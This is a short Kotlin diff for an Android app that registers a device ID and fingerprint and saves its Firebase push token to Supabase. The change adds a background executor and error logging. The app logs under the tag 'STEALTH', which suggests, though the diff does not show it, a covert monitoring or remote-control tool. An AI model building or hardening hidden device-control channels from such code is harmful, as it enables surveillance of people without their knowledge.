@@ -13,6 +13,7 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import java.io.File
 import java.net.URL
+import java.util.concurrent.Executors
 
 object Core {
     private const val TAG = "STEALTH"
@@ -32,13 +33,23 @@ object Core {
                 Transport.registerDevice(deviceId, fingerprint)
                 Log.d(TAG, "Device registered")
 
-                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
-                    if (task.isSuccessful) {
-                        val token = task.result
-                        if (token != null) {
-                            Transport.saveFcmToken(deviceId, token)
-                            Log.d(TAG, "FCM token saved")
+                val fcmExecutor = Executors.newSingleThreadExecutor()
+                FirebaseMessaging.getInstance().token.addOnCompleteListener(fcmExecutor) { task ->
+                    try {
+                        if (task.isSuccessful) {
+                            val token = task.result
+                            if (token != null) {
+                                Log.d(TAG, "FCM token obtained: ${token.take(20)}...")
+                                Transport.saveFcmToken(deviceId, token)
+                                Log.d(TAG, "FCM token saved to Supabase")
+                            } else {
+                                Log.e(TAG, "FCM token is null")
+                            }
+                        } else {
+                            Log.e(TAG, "FCM token fetch failed: ${task.exception?.message}")
                         }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "FCM token save error: ${e.message}")
                     }
                 }
 
